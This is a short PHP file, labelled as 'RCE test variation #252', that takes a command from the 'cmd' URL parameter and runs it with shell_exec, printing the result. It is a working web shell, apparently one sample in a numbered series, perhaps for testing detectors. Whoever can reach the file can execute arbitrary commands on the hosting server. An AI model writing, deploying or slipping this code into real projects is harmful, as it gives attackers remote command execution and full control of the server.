<?php
// RCE test variation #252
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>